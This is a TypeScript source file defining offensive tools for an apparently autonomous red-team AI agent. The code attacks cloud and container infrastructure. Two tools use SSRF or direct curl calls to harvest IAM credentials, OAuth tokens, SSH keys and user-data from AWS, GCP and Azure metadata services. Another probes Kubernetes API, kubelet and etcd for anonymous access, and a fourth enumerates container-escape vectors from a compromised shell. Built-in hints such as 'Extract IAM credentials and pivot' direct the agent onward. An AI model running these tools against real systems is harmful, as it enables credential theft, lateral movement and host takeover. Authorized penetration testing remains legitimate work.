import { FunctionTool } from '@google/adk'
import { z } from 'zod/v4'
import { kesExec } from '../../shared/kes-client.js'
import { createLogger } from '../../shared/logger.js'
import { buildTargetUrl } from '../lib/port-protocol.js'

const logger = createLogger('red_team_agent')

export const imdsProbeTool = new FunctionTool({
  name: 'imds_probe',
  description: `Probe a target for cloud Instance Metadata Service (IMDS) exposure either directly (when on a foothold) or via SSRF (using a vulnerable parameter to fetch http://169.254.169.254/...).
Tries IMDSv1 (no token) and IMDSv2 (token first) on AWS, plus GCP and Azure metadata endpoints.`,
  parameters: z.object({
    mode: z.enum(['direct', 'ssrf']).describe('direct = run from a shell on the host; ssrf = use a vulnerable URL on the target to fetch metadata'),
    target: z.string().optional().describe('SSRF mode: target host'),
    port: z.number().optional().describe('SSRF mode: target port'),
    nmapTags: z.array(z.string()).optional(),
    ssrfUrl: z.string().optional().describe('SSRF mode: full URL with the SSRF param, e.g. https://app/fetch?url=PAYLOAD'),
    ssrfPlaceholder: z.string().optional().describe('SSRF mode: literal string in ssrfUrl to replace with the metadata URL (default PAYLOAD)'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ mode, target, port, nmapTags, ssrfUrl, ssrfPlaceholder, campaignId }) => {
    const start = Date.now()
    const targets: Array<{ name: string; url: string; tokenUrl?: string }> = [
      { name: 'aws_imdsv1_role', url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
      { name: 'aws_imdsv2', url: 'http://169.254.169.254/latest/meta-data/', tokenUrl: 'http://169.254.169.254/latest/api/token' },
      { name: 'gcp_token', url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' },
      { name: 'azure_token', url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' },
    ]

    const out: Record<string, { status: string; body: string; reachable: boolean }> = {}

    for (const t of targets) {
      let cmd: string
      if (mode === 'direct') {
        if (t.tokenUrl) {
          cmd = `TOKEN=$(curl -s -X PUT --max-time 5 -H "X-aws-ec2-metadata-token-ttl-seconds: 60" "${t.tokenUrl}") && curl -s --max-time 5 -H "X-aws-ec2-metadata-token: $TOKEN" "${t.url}"`
        } else if (t.name === 'gcp_token') {
          cmd = `curl -s --max-time 5 -H "Metadata-Flavor: Google" "${t.url}"`
        } else if (t.name === 'azure_token') {
          cmd = `curl -s --max-time 5 -H "Metadata: true" "${t.url}"`
        } else {
          cmd = `curl -s --max-time 5 "${t.url}"`
        }
      } else {
        if (!ssrfUrl) {
          out[t.name] = { status: 'skipped', body: 'ssrfUrl required in ssrf mode', reachable: false }
          continue
        }
        const placeholder = ssrfPlaceholder ?? 'PAYLOAD'
        const payload = encodeURIComponent(t.url)
        const fullUrl = ssrfUrl.replace(placeholder, payload)
        cmd = `curl -s --max-time 8 -k "${fullUrl}"`
      }

      const r = await kesExec(cmd, 12)
      const body = r.stdout.slice(0, 1500)
      const reachable = body.length > 0 && !/connection refused|timed out|could not resolve/i.test(body)
      out[t.name] = { status: r.returncode === 0 ? 'ok' : 'err', body, reachable }
    }

    const reachable = Object.entries(out).filter(([, v]) => v.reachable).map(([k]) => k)

    await logger.audit('imds_probe', { mode, target }, { reachable }, Date.now() - start, campaignId)
    return {
      mode,
      results: out,
      reachable,
      hint: reachable.length > 0
        ? 'Metadata reachable. Extract IAM credentials and pivot via cloud_meta_enum / aws-cli.'
        : 'No metadata endpoint reachable.',
    }
  },
})

export const k8sProbeTool = new FunctionTool({
  name: 'k8s_probe',
  description: `Probe a Kubernetes API server for anonymous access, exposed kubelet (10250), exposed etcd (2379), service-account token endpoints, and common misconfigurations (allow-all RBAC, insecure dashboard).`,
  parameters: z.object({
    target: z.string().describe('Kubernetes API server IP/hostname'),
    apiPort: z.number().optional().describe('K8s API port (default 6443)'),
    kubeletPort: z.number().optional().describe('Kubelet port (default 10250)'),
    etcdPort: z.number().optional().describe('etcd port (default 2379)'),
    bearerToken: z.string().optional().describe('Optional bearer token (white-box mode)'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ target, apiPort, kubeletPort, etcdPort, bearerToken, campaignId }) => {
    const start = Date.now()
    const api = apiPort ?? 6443
    const kubelet = kubeletPort ?? 10250
    const etcd = etcdPort ?? 2379

    const auth = bearerToken ? `-H "Authorization: Bearer ${bearerToken}"` : ''

    const apiVersion = await kesExec(`curl -s -k --max-time 6 ${auth} https://${target}:${api}/version`, 10)
    const apiAnon = await kesExec(`curl -s -k --max-time 6 https://${target}:${api}/api/v1/namespaces`, 10)
    const kubeletPods = await kesExec(`curl -s -k --max-time 6 https://${target}:${kubelet}/pods`, 10)
    const etcdHealth = await kesExec(`curl -s -k --max-time 6 https://${target}:${etcd}/health`, 10)
    const dashboard = await kesExec(`curl -s -k --max-time 6 https://${target}:30000/`, 8)

    const findings: string[] = []
    if (/"gitVersion"/.test(apiVersion.stdout)) findings.push(`K8s API reachable at :${api}`)
    if (/"items"/.test(apiAnon.stdout)) findings.push('CRITICAL: API allows anonymous namespace listing')
    if (/"items":\[/.test(kubeletPods.stdout) && kubeletPods.stdout.length > 100) findings.push(`CRITICAL: kubelet :${kubelet} exposes pod list — RCE via /run/<ns>/<pod>/<container>`)
    if (/"health"\s*:\s*"true"/.test(etcdHealth.stdout)) findings.push(`CRITICAL: etcd :${etcd} accessible — full cluster state at risk`)
    if (/Kubernetes Dashboard/i.test(dashboard.stdout)) findings.push('Kubernetes Dashboard exposed on :30000')

    if (bearerToken) {
      const sa = await kesExec(`curl -s -k --max-time 6 ${auth} https://${target}:${api}/api/v1/serviceaccounts?limit=20`, 10)
      if (/"items"/.test(sa.stdout)) findings.push('Bearer token can list service accounts cluster-wide')
    }

    await logger.audit('k8s_probe', { target, api, kubelet, etcd }, { findingsCount: findings.length }, Date.now() - start, campaignId)
    return {
      target,
      findings,
      evidence: {
        version: apiVersion.stdout.slice(0, 600),
        kubelet: kubeletPods.stdout.slice(0, 600),
        etcd: etcdHealth.stdout.slice(0, 200),
      },
    }
  },
})

export const containerEscapeReconTool = new FunctionTool({
  name: 'container_escape_recon',
  description: `From inside a compromised shell on a container, enumerate escape vectors: capabilities, mounted docker.sock, privileged mode, host PID namespace, sensitive mounts, kernel exploits applicable.
Run AFTER you have a shell.`,
  parameters: z.object({
    sessionDescriptor: z.string().describe('How to execute commands inside the container — full prefix, e.g. "msfconsole sessions -i 1 execute -f " or "ssh user@host" — the tool will append shell commands.'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ sessionDescriptor, campaignId }) => {
    const start = Date.now()

    const checks: Array<{ name: string; command: string }> = [
      { name: 'capabilities', command: 'capsh --print 2>/dev/null || cat /proc/self/status | grep Cap' },
      { name: 'docker_sock', command: 'ls -la /var/run/docker.sock 2>/dev/null' },
      { name: 'privileged', command: 'cat /proc/1/status | grep CapEff' },
      { name: 'host_pid', command: 'ps -ef | head -3' },
      { name: 'mounts', command: 'mount | grep -E "(docker|host|/proc|cgroup)" | head -20' },
      { name: 'cgroup', command: 'cat /proc/1/cgroup' },
      { name: 'kernel', command: 'uname -r' },
      { name: 'release_agent', command: 'cat /sys/fs/cgroup/release_agent 2>/dev/null; ls /sys/fs/cgroup 2>/dev/null | head -5' },
    ]

    const results: Record<string, string> = {}
    for (const c of checks) {
      const r = await kesExec(`${sessionDescriptor} '${c.command.replace(/'/g, "'\\''")}'`, 15)
      results[c.name] = r.stdout.slice(0, 1000)
    }

    const escapeVectors: string[] = []
    if (/cap_sys_admin/i.test(results.capabilities ?? '')) escapeVectors.push('CAP_SYS_ADMIN — release_agent escape, mount host fs')
    if (/dac_read_search/i.test(results.capabilities ?? '')) escapeVectors.push('CAP_DAC_READ_SEARCH — open_by_handle_at host fs read')
    if (/srwxrwxrwx.*docker\.sock/i.test(results.docker_sock ?? '') || results.docker_sock?.includes('docker.sock')) {
      escapeVectors.push('Docker socket mounted — `docker run -v /:/host` for full host access')
    }
    if (/000000ffffffffff/i.test(results.privileged ?? '') || /CapEff:\s+0000003fffffffff/i.test(results.privileged ?? '')) {
      escapeVectors.push('Container running --privileged — direct device access, mount /dev/sda1')
    }

    await logger.audit('container_escape_recon', { sessionDescriptor }, { vectors: escapeVectors }, Date.now() - start, campaignId)
    return { results, escapeVectors, hint: escapeVectors.length > 0 ? 'Pursue the escape vectors above.' : 'No obvious container escape vectors found from this enumeration.' }
  },
})

export const cloudMetaEnumTool = new FunctionTool({
  name: 'cloud_meta_enum',
  description: `Given an IMDS-reachable target (web SSRF or shell), enumerate full cloud metadata: instance role, ssh keys, user-data, network config, attached storage. Builds a complete attack picture for cloud pivoting.`,
  parameters: z.object({
    mode: z.enum(['direct', 'ssrf']),
    cloud: z.enum(['aws', 'gcp', 'azure']).describe('Cloud provider detected from imds_probe'),
    ssrfUrl: z.string().optional().describe('SSRF mode: URL with placeholder'),
    ssrfPlaceholder: z.string().optional().describe('Placeholder string (default PAYLOAD)'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ mode, cloud, ssrfUrl, ssrfPlaceholder, campaignId }) => {
    const start = Date.now()
    const placeholder = ssrfPlaceholder ?? 'PAYLOAD'

    const aws = [
      'http://169.254.169.254/latest/meta-data/iam/info',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://169.254.169.254/latest/meta-data/instance-id',
      'http://169.254.169.254/latest/meta-data/local-ipv4',
      'http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key',
      'http://169.254.169.254/latest/user-data',
    ]
    const gcp = [
      'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email',
      'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes',
      'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
      'http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true',
    ]
    const azure = [
      'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
      'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
      'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/',
    ]

    const urls = cloud === 'aws' ? aws : cloud === 'gcp' ? gcp : azure
    const headerFlag = cloud === 'gcp' ? '-H "Metadata-Flavor: Google"' : cloud === 'azure' ? '-H "Metadata: true"' : ''

    const out: Record<string, string> = {}
    for (const u of urls) {
      let cmd: string
      if (mode === 'direct') {
        if (cloud === 'aws') {
          cmd = `TOKEN=$(curl -s -X PUT --max-time 5 -H "X-aws-ec2-metadata-token-ttl-seconds: 60" "http://169.254.169.254/latest/api/token") && curl -s --max-time 5 -H "X-aws-ec2-metadata-token: $TOKEN" "${u}"`
        } else {
          cmd = `curl -s --max-time 5 ${headerFlag} "${u}"`
        }
      } else {
        if (!ssrfUrl) { out[u] = 'ssrfUrl required'; continue }
        cmd = `curl -s --max-time 8 -k "${ssrfUrl.replace(placeholder, encodeURIComponent(u))}"`
      }
      const r = await kesExec(cmd, 12)
      out[u] = r.stdout.slice(0, 1500)
    }

    await logger.audit('cloud_meta_enum', { mode, cloud }, { keys: Object.keys(out).length }, Date.now() - start, campaignId)
    return { cloud, results: out }
  },
})
